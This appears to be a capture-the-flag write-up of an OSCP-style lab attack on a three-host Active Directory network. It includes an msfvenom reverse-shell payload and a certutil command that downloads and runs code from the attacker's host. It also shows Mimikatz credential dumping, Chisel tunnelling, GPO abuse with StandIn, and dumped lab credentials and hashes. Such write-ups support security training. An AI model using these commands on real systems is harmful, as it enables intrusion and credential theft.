#CTF/OSCP/ChallengeLab

# Given

We have been tasked to conduct a penetration test on the network of _Secura_. Several vulnerabilities and misconfigurations are present on the Active Directory environment, which can be leveraged by an attacker to gain access to all workstations. The main objective is obtain access to the Domain Controller.

The public subnet of the network resides in the `192.168.xx.0/24` range, where the `xx` of the third octet can be found under the _IP ADDRESS_ field in the control panel.

## IP

192.168.126.97
192.168.126.96
192.168.126.95

## Given Creds

```bash
192.168.126.95
Eric.Wallows : EricLikesRunning800
```

# Writeup

## External Enumeration

I started with nmap scans of all 3 of the given ip addresses with a very helpful one liner for each. Thank you good sir. I'l go about this by host.

```bash
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN enum/nmap.ports && sleep 5 && nmap -Pn $target -sCV -v -oN enum/nmap.services && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN enum/nmap.vulns
```

## Host .95

```bash
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5001/tcp  open  commplex-link
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
8443/tcp  open  https-alt
12000/tcp open  cce4x
44444/tcp open  cognex-dataman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49673/tcp open  unknown
51694/tcp open  unknown
51725/tcp open  unknown
62950/tcp open  unknown
62951/tcp open  unknown
```

There's a service called `App Manager` running on port `tcp/8443` that might be an interesting place to start. There's also `SMB(tcp/445` that might have something for us with our starter creds (spoiler: smb was a bust).

Navigating to `https://192.168.126.95:8443` brings us to the login page for Applications Manager. We get lucky because the default credentials are still in play, and we get in with `admin/admin`.

The first thing to do here, is find an "About" section, to look at what version this app is running, and what other tech is under the hood. 

- App version 14
- Build 14710
- Database: Postgres - There's a database!

![](assets/Pasted%20image%2020250731132950.png)

Searchsploit gives us an exploit for this, and well... it didn't really work out for me. 

![](assets/Pasted%20image%2020250731133059.png)

So it was on to examining the dashboard in hopes of finding a way to get access.

There's a part of the dashboard that allows you to upload scripts. This might be a good way in.

### Exploit

To get there, we're going to need a payload, and file that can pull it off our server, transfer it onto the target server, and execute it.

Breaking this down, we're going to need a payload first. I used `msfvenom` to craft one out.

`msfvenom -p windows/x64/shell/reverse_tcp lhost=<attacker ip> lport=4444 -f exe -o /payloads/reverse.exe

This is what gets us the reverse shell. Next we need a script to transfer this from our server to the target, and execute it.

`certutil.exe -f -urlcache -split http://<IP>/reverse.exe c:\windows\temp\reverse.exe && cmd.exe /c c:\windows\temp\reverse.exe`

We save this bit of code as `cmd.bat` and upload it to the application manager. *Make sure to select the option that uploads the script to the /working/ directory*.

In order for this to work, we need a listener on `tcp 4444` and we need a python server hosting the `reverse.exe` file.

We run `nc -lnvp 4444`, and `python3 -m http.server`. Then we launch our script on the applications manager via the `Actions` dropdown, and listen for an incoming connection.

![](assets/Pasted%20image%2020250731134644.png)

The flag is on the desktop.

![](assets/Pasted%20image%2020250731134957.png)

### Persistence

We don't want to go over the same process again and again, so we establish peristence by dumping the creds of the user accounts on this machine.

First we transfer mimikatz from attacker to target

```bash
certutil.exe -f -urlcache -split 'http://192.168.45.204:8000/Invoke-Mimikatz.ps1'
```

Next we run `Invoke-Mimikatz -DumpCreds`

![](assets/Pasted%20image%2020250801151658.png)

This gets us the NTLM hash for the Administrator, as well as some creds for the user `apache` We can always connect to this machine using evil-winrm.

Testing the new set of creds against all the machines using `netexec` shows us that we can login into the next machine on our list using `apache/New2Era4.!`

![](assets/Pasted%20image%2020250801153753.png)

## Host .96

The creds for the user `apache` works on the `winrm` service too. This gets us a foothold into this machine with `evil-winrm` .

![](assets/Pasted%20image%2020250801154523.png)

So now I'm in the second pc without a lot of access.

![](assets/Pasted%20image%2020250801154541.png)

I can't directly connect to mysql from here, even though I know its running on this system. So I try to tunnel into it with `Chisel`, and run mysql from there with the creds I got earlier from mimikatz.

There is an Administrator, and it is likely that the flag is on the desktop, but we don't have access to it.

### Chisel

Two things with Chisel. We need a sever and an client. Our machine is the server, and the target is the client.

**Server**

![](assets/Pasted%20image%2020250801172123.png)

**Client**

![](assets/Pasted%20image%2020250801172104.png)

Once the connection is set up, I'll access the mysql instance directly using my forwarded port (1234).

![](assets/Pasted%20image%2020250801172205.png)

I look at the tables, and there's a table called `creds`. Getting all the records from it gives me the following

![](assets/Pasted%20image%2020250801172703.png)

This means that I can run `evil-winrm` again as the administrator, and get into this machine. The flag is on the desktop. And there's a local flag in the `apache` user's desktop as well. 

![](assets/Pasted%20image%2020250801172938.png)

## Host .97

This is the actual **privesc** part of the exercise. Since we know from running nmap on this host, that it is probably the domain controller (`dc01.secura.yzx`). in fact, we can run netexec in order to enumerate users and groups using either the creds given to us at the start, or the ones for charlotte that we gleaned from host .96. That allows us to do something like

### Enumeration via Bloodhound

`nxc ldap 192.168.126.97 -u charlotte -p 'Game2On4.!' --bloodhound --collection All`. This is going to make use to the bloodhound ingestor on netexec, and give us the users, groups and their relationships in a visually understandable way.

Seeing as we're using Charlotte's account now, it stands to reason that hers is the first account I'd look at. And turns out it has some interesting permissions over the Group Policy called `Default Domain Policy`.

![](assets/Pasted%20image%2020250801173607.png)

I tried targeting the `WriteDacl` permission, but Impacket-dacledit failed once again. Along with other GPO abuse techniques like SharpGPOAbuse.exe, and PyGPOAbuse.py.

### Exoloit

Found the following guide that mentions StandIn.

https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-group-policy-objects/#abuse-gpo-with-standin

Start by checking what GPOs exist on this machine. `./StandIn_v13_Net45.exe --GPO`

 

![](assets/Pasted%20image%2020250801230542.png)

Next we filter for accounts which are part of the ACL, and look at what kind of permissions they have over the GPO called Default Domain Policy.

`./StandIn_v13_Net45.exe --GPO --filter "default domain policy" --acl `

![](assets/Pasted%20image%2020250801230721.png)

![](assets/Pasted%20image%2020250801230747.png)

Since we have Full Control over this GPO, we can elevate our privileges to admin. 

`./StandIn_v13_Net45.exe --GPO --filter "default domain policy" --localadmin charlotte`

![](assets/Pasted%20image%2020250801230850.png)

A quick check with the PowerView module helps us see that charlotte is an admin too! `C:\temp\payloads> get-domaingroupmember -Identity "Administrators"`

![](assets/Pasted%20image%2020250801230440.png)

Get out of the winrm session, and get back in, because the group policy will be refreshed then. Flag is on the desktop of `Administrator.DC01`

![](assets/Pasted%20image%2020250801231155.png)

**note: I'll try the other ways again, and pen down the results**

# Creds

**192.168.126.95**
administrator : a51493b0b06e5e35f855245e71af1d14

**192.168.126.96**
administrator : Almost4There8.? 
charlotte :  Game2On4.!